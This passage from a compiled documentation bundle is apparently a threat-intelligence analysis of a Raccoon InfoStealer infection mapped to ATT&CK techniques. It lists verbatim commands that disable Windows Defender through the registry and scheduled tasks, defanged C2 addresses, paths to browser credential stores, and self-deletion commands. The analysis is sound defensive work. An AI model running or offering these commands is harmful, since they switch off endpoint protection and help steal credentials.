\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableOnAccessProtection\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableRealtimeMonitoring\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableScanOnRealtimeEnable\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Reporting\\" /v \\"DisableEnhancedNotifications\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v \\"DisableBlockAtFirstSeen\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v \\"SpynetReporting\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v \\"SubmitSamplesConsent\\" /t REG_DWORD /d \\"2\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger\\" /v \\"Start\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger\\" /v \\"Start\\" /t REG_DWORD /d \\"0\\" /f'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware launched ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," (attempted to modify Windows Defender ",(0,l.kt)("em",{parentName:"td"},"scheduled tasks"),")"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\" /Disable'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware launched ",(0,l.kt)("em",{parentName:"td"},"REG.exe")," (attempted to modify Windows Defender ",(0,l.kt)("em",{parentName:"td"},"services configuration"),")."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run\\" /v \\"SecurityHealth\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" /v \\"SecurityHealth\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"setting Start to 4 means disabling the service.")),(0,l.kt)("h3",{id:"threat-actor-used-antiav-an-open-source-tool-obfuscation-tool-to-obfuscate-malware-binary-file-for-defense-evasion"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"AntiAV")," (an open source tool obfuscation tool) to obfuscate malware binary file for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1140 - Deobfuscate/Decode Files or Information"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1140",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware executed open source deobfuscator tool (",(0,l.kt)("a",{parentName:"td",href:"https://github.com/hXR16F/AntiAV/"},"https://github.com/hXR16F/AntiAV/"),") via CMD.exe."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\main.bat\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1140"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware created Raccoon InfoStealer binary file at %ProgramData% folder."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"))))),(0,l.kt)("h4",{id:"notes-4"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Script available at VT ",(0,l.kt)("a",{parentName:"li",href:"https://www.virustotal.com/gui/file/a3d45f57d6b62b2d09c4dcca451bf06a0ef330664b796813841d7ea0934fcf06/content"},"https://www.virustotal.com/gui/file/a3d45f57d6b62b2d09c4dcca451bf06a0ef330664b796813841d7ea0934fcf06/content")),(0,l.kt)("li",{parentName:"ul"},"detection rate 0/58 (Oct 2nd 2021)"),(0,l.kt)("li",{parentName:"ul"},"main.bat is an obfuscator ",(0,l.kt)("a",{parentName:"li",href:"https://github.com/hXR16F/AntiAV/"},"https://github.com/hXR16F/AntiAV/"),"."),(0,l.kt)("li",{parentName:"ul"},"door.exe is available at VT ",(0,l.kt)("a",{parentName:"li",href:"https://www.virustotal.com/gui/file/a1ff11c6e6e4aa54b60a2d44b6d2f05a48e6c617f0d89801a90ec56c29223b21"},"https://www.virustotal.com/gui/file/a1ff11c6e6e4aa54b60a2d44b6d2f05a48e6c617f0d89801a90ec56c29223b21")),(0,l.kt)("li",{parentName:"ul"},"first submited around the time of this sighting."),(0,l.kt)("li",{parentName:"ul"},"current detection is 45/69 (oct 2nd 2021)")),(0,l.kt)("h3",{id:"threat-actor-used-cmd-to-launch-raccoon-infostealer-for-execution"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"CMD")," to launch Raccoon InfoStealer for Execution."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer was launched via ",(0,l.kt)("em",{parentName:"td"},"CMD"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"door.exe"'))))),(0,l.kt)("h4",{id:"notes-5"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"door.exe is the info stealer.")),(0,l.kt)("h3",{id:"malware-used-http-to-download-additional-tools-for-command-and-control"},"Malware used HTTP to download additional tools for Command And Control."),(0,l.kt)("h4",{id:"tactic-6"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-6"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon malware executed by itself"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer connected to C2 server (telete","[.]","in:443)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"195.201.225[.]248"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"telete[.]in"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer connected to C2 server (port IP:80)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"185.53.46[.]105"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer downloaded a copy of sqlite3.dll from C2 server"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C\\\\Users\\\\#{user}\\\\AppData\\\\LocalLow\\\\sqlite3.dll"))))),(0,l.kt)("h4",{id:"notes-6"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Process image file is not signed."),(0,l.kt)("li",{parentName:"ul"},"IP addresses correspond to the Russian Federation"),(0,l.kt)("li",{parentName:"ul"},"IP addresses correspond to Czech Republic and Republic of Moldova"),(0,l.kt)("li",{parentName:"ul"},"SQLite is a software library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine."),(0,l.kt)("li",{parentName:"ul"},"Threat Actors leverage SQLite to access the credential databases")),(0,l.kt)("h3",{id:"malware-used-native-apis-to-access-chrome-credentials-store-for-credential-access"},"Malware used ",(0,l.kt)("em",{parentName:"h3"},"Native APIs")," to access Chrome credentials store for Credential Access."),(0,l.kt)("h4",{id:"tactic-7"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-7"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"),(0,l.kt)("li",{parentName:"ul"},"T1106 - Native API")),(0,l.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer reads Chrome credentials store"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Read"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003",(0,l.kt)("br",null),"T1106"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer calls CryptUnprotectData API."),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h4",{id:"notes-7"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},'"',"\\","User Data","\\","Default","\\",'Login Data" is a SQlite3 database that stores the credentials of the Default profile'),(0,l.kt)("li",{parentName:"ul"},"Values are encrypted using Microsoft\ufffds Data Protection API (DPAPI)"),(0,l.kt)("li",{parentName:"ul"},"DPAPI consists of 2 functions -> CryptProtectData() and CryptUnprotectData() which symetrically encrypt/decrypt data."),(0,l.kt)("li",{parentName:"ul"},"CryptUnprotectData function decrypts data using implicit crypto keys tied to a specific user or system.")),(0,l.kt)("h3",{id:"malware-used-sqlite3-dll-to-read-firefox-credentials-store-for-credential-access"},"Malware used ",(0,l.kt)("em",{parentName:"h3"},"SQlite3")," DLL to read Firefox credentials store for Credential Access."),(0,l.kt)("h4",{id:"tactic-8"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-8"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1555.003 - Credentials from Password Stores: Credentials from Web Browsers")),(0,l.kt)("h4",{id:"behaviors-and-observables-8"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer accessed Firefox credential store."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Modified"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\cert9.db"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\key4.db"))))),(0,l.kt)("h4",{id:"notes-8"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"cert9.db is a SQLite database that stores security certificate settings and SSL certificates imported into Firefox."),(0,l.kt)("li",{parentName:"ul"},"key4.db is a SQLite database that stores passwords."),(0,l.kt)("li",{parentName:"ul"},"logins.json stores (encrypted) passwords"),(0,l.kt)("li",{parentName:"ul"},"as a previous step, SQlite3 dll was downloaded.")),(0,l.kt)("h3",{id:"malware-used-unconfirmed-method-to-create-a-zip-file-for-collection"},"Malware used ",(0,l.kt)("em",{parentName:"h3"},"unconfirmed method")," to create a ",(0,l.kt)("em",{parentName:"h3"},".zip")," file for Collection."),(0,l.kt)("h4",{id:"tactic-9"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Collection")),(0,l.kt)("h4",{id:"techniques-9"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1560 - Archive Collected Data")),(0,l.kt)("h4",{id:"behaviors-and-observables-9"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1560"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer created a zip file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\LocalLow\\\\bjZYHn4lcwr.zip"))))),(0,l.kt)("h4",{id:"notes-9"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"it is not known to us, the method used to create the ",(0,l.kt)("em",{parentName:"li"},"zip")," file.")),(0,l.kt)("h3",{id:"malware-used-cloud-storage-for-exfiltration"},"Malware used ",(0,l.kt)("em",{parentName:"h3"},"cloud storage")," for Exfiltration."),(0,l.kt)("h4",{id:"tactic-10"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Exfiltration")),(0,l.kt)("h4",{id:"techniques-10"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage")),(0,l.kt)("h4",{id:"behaviors-and-observables-10"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1567.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon performed DNS Queries to cdn.discordapp","[.]","com."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"cdn.discordapp[.]com"))))),(0,l.kt)("h4",{id:"notes-10"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discord is a VoIP, instant messaging and digital distribution platform."),(0,l.kt)("li",{parentName:"ul"},"DNS Query events are precursory indicators of network ativity.")),(0,l.kt)("h3",{id:"malware-used-cmd-delayed-command-execution-to-delelete-itself-for-defense-evasion"},"Malware used ",(0,l.kt)("em",{parentName:"h3"},"CMD delayed command execution")," to delelete itself for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-11"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-11"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1070.004 - Indicator Removal on Host: File Deletion"),(0,l.kt)("li",{parentName:"ul"},"T1059 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-11"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1070.004",(0,l.kt)("br",null),"T1059"),(0,l.kt)("td",{parentName:"tr",align:null},"Raccoon InfoStealer introduced a delayed command execution via CMD to delete itself."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /C timeout /T 10 /NOBREAK > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'))))),(0,l.kt)("h4",{id:"notes-11"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Via Timeout command a delay of 10 seconds is introduced."),(0,l.kt)("li",{parentName:"ul"},"Via ping command a delay of 3000 miliseconds is introduced."),(0,l.kt)("li",{parentName:"ul"},"Del is native cmd function for deleting files.")))}p.isMDXComponent=!0}}]);